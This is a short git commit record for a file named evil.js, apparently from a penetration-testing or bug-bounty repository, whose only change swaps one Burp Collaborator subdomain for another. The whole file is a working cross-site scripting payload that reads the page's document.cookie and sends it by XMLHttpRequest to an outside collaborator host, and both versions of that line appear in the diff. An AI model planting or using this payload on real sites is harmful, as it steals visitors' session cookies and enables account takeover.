046467a163403c4619032bafacd73d7f5b1bc432
aif2202 <120558865+aif2202@users.noreply.github.com>
2022-12-27 15:51:52 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://l5r0qebjaamafyjcghngafsie9k08p.burpcollaborator.net/?' + document.cookie, true);
+xhttp.open('GET', 'http://vcbmgtf4pmpke0w0vjhsdo88wz2qqf.burpcollaborator.net/?' + document.cookie, true);
 xhttp.send();
